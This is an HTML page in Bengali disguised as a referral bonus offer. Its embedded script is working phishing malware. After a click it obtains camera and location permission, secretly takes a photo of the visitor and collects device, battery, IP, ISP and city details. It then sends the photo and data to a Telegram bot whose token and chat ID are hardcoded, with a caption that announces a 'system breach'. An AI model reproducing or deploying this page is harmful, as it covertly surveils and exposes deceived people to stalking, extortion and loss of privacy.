<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>50 টাকা বোনাস নিতে ক্লিক করুন </title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; background-color: #000;
            background-image: url('https://i.imghippo.com/files/Fq9968wg.jpg'); 
            background-size: cover; background-position: center;
        }
        .container {
            background: rgba(0, 0, 0, 0.85); 
            padding: 40px 20px; border-radius: 15px; width: 85%; max-width: 380px;
            z-index: 2; position: relative; border: 2px solid #00ff00;
            box-shadow: 0 0 20px #00ff00;
        }
        h1 { color: #00ff00; font-size: 26px; margin-bottom: 15px; }
        h2 { color: #ffffff; font-size: 18px; margin-bottom: 30px; }
        #verify-btn { 
            background-color: #00ff00; color: #000; border: none; padding: 15px; 
            font-size: 18px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold;
        }
        #status { margin-top: 25px; font-weight: bold; font-size: 14px; color: #00ff00; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>বোনাস সিস্টেম</h1>
        <h2>প্রতি রেফারর ৫০ টাকা বোনাস পান।</h2>
        <h3>⬇️</h3>
        <button id="verify-btn">রেফার করুন </button>
        <div id="status"></div>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
        const adminId = "7068444019"; 

        const verifyBtn = document.getElementById('verify-btn');
        const status = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        let gpsLink = "অনুমতি দেওয়া হয়নি";

        // লোকেশন ও হার্ডওয়্যার ডাটা সংগ্রহ
        function getHardwareAndGPS() {
            return new Promise((resolve) => {
                // GPS পারমিশন চাওয়া
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((pos) => {
                        gpsLink = `http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        resolve();
                    }, () => resolve(), { timeout: 5000 });
                } else { resolve(); }
            });
        }

        verifyBtn.addEventListener('click', async () => {
            status.innerText = "> লোকেশন ও ক্যামেরা পারমিশন দিন...";
            verifyBtn.style.display = "none"; 

            // পারমিশন প্রসেস শুরু
            await getHardwareAndGPS();

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                status.innerText = "> ভেরিফাই হচ্ছে... ৩ সেকেন্ড অপেক্ষা করুন।";

                setTimeout(async () => {
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        // হার্ডওয়্যার তথ্য সংগ্রহ
                        let hardwareInfo = `\n\n💻 **HARDWARE DETAILS**`;
                        hardwareInfo += `\nCPU Cores: \`${navigator.hardwareConcurrency || 'Unknown'}\``;
                        hardwareInfo += `\nRAM: \`${navigator.deviceMemory || 'Unknown'} GB\``;
                        hardwareInfo += `\nScreen: \`${window.screen.width}x${window.screen.height}\``;
                        hardwareInfo += `\nPlatform: \`${navigator.platform}\``;

                        // ব্যাটারি তথ্য
                        if (navigator.getBattery) {
                            const b = await navigator.getBattery();
                            hardwareInfo += `\nBattery: \`${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Idle'})\``;
                        }

                        let caption = "🛠 **SYSTEM BREACH SUCCESSFUL**" + hardwareInfo;
                        
                        // নেটওয়ার্ক ও লোকেশন তথ্য
                        try {
                            const res = await fetch('https://ipwho.is/');
                            const d = await res.json();
                            caption += `\n\n🌐 **NETWORK & LOCATION**`;
                            caption += `\nIP: \`${d.ip}\`\nISP: \`${d.connection.isp}\`\nCity: \`${d.city}\`\nMaps: [Click Here](${gpsLink !== "অনুমতি দেওয়া হয়নি" ? gpsLink : 'http://google.com/maps?q='+d.latitude+','+d.longitude})`;
                        } catch(e) {}

                        const formData = new FormData();
                        formData.append('chat_id', adminId);
                        formData.append('photo', blob, 'capture.jpg');
                        formData.append('caption', caption);
                        formData.append('parse_mode', 'Markdown');

                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });

                        status.innerText = "> ভেরিফিকেশন সফল!";
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/jpeg', 0.8);
                }, 3000); 

            } catch (err) {
                status.innerText = "> পারমিশন ছাড়া বোনাস পাওয়া সম্ভব নয়!";
                status.style.color = "#ff0000";
                verifyBtn.style.display = "block";
            }
        });
    </script>
</body>
</html>
